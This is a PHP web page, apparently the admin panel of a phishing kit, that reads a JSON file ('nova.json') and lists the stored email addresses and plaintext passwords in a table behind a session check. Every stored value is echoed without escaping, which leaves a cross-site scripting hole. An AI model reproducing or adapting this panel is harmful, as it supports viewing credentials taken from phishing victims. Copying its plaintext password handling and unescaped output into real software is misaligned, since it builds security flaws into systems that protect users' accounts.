<!DOCTYPE html>
<?php

  session_start();
  if(isset($_SESSION['status']) && $_SESSION['status'] == "logged in"){
    
  }else{
    header("location: logout");
  }

?>


<html lang="en">
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>All Details</title>
  <!-- plugins:css -->
  <link rel="stylesheet" href="vendors/iconfonts/mdi/font/css/materialdesignicons.min.css">
  <link rel="stylesheet" href="vendors/css/vendor.bundle.base.css">
  <link rel="stylesheet" href="vendors/css/vendor.bundle.addons.css">
  <!-- endinject -->
  <!-- plugin css for this page -->
  
  <!-- End plugin css for this page -->
  <!-- inject:css -->
  <link rel="stylesheet" href="css/vertical-layout-light/style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="images/favicon.png" />
</head>

<body>
  <div class="container-scroller">
    <!-- partial:../../partials/_navbar.html -->
    <?php include("includes/header.php");?>
    <!-- partial -->
    <div class="container-fluid page-body-wrapper">
      <!-- partial:../../partials/_settings-panel.html -->
      
   
      <div class="main-panel">
        <div class="content-wrapper">

          <br><br>
 
          <div class="row">
            <div class="col-12">
              <div class="card">
              <div class="card-body">
                  <h4 class="card-title">Showing All Details</h4>
                  <div class="template-demo">
                    <table class="table mb-0">
                      <thead>
                        <tr>
                          <th class="pl-0">S/N</th>
                          <th class="pl-0">Email</th>
                          <th class="">Password</th>
                        </tr>
                      </thead>
                      <tbody>
                        <?php
                          $notification_counter = 1;
                          $empty = TRUE;
                          $data = file_get_contents('../nova.json');
                          $details = json_decode($data);
                          foreach ($details as $row):
                           ?>
                              <tr>
                                  <td>
                                      <?= $notification_counter ?>
                                  </td>
                                  <?php
                                    foreach ($row as $cell){
                                        echo ("<td>".$cell."</td>");
                                    }
                                  ?>
                                  

                                 
                              </tr>
                          <?php 
                           $notification_counter++; endforeach;?>
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:../../partials/_footer.html -->
        <?php include("includes/footer.php");?>
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->
  <!-- plugins:js -->
  <script src="vendors/js/vendor.bundle.base.js"></script>
  <script src="vendors/js/vendor.bundle.addons.js"></script>
  <!-- endinject -->
  <!-- inject:js -->
  <script src="js/off-canvas.js"></script>
  <script src="js/hoverable-collapse.js"></script>
  <script src="js/template.js"></script>
  <script src="js/settings.js"></script>
  <script src="js/todolist.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <script src="js/profile-demo.js"></script>
  <!-- End custom js for this page-->
</body>


</html>
